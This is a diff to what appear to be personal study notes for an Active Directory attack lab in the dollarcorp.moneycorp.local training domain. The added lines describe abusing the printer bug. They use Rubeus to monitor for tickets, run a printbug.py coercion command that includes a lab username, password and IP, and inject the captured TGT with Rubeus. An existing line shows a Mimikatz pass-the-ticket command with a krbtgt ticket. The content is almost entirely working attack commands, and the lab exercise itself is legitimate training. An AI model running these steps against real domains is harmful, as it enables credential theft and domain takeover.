@@ -285,7 +285,19 @@ re-use/inject:
 Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user500\[0;1a5d18]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 ```
 
-CAN ALSO use the printer bug
+CAN ALSO use the printer bug:
+monitor ticket with rubeus:
+```
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
+trigger print bug:
+```
+python3 printbug.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM@172.16.2.1 dcorp-appsrv.dollarcorp.moneycorp.local
+```
+then inject the tgt:
+```
+.\Rubeus.exe ptt /ticket:<ticket>
+```
 
 
 --------------------------------------------------------------
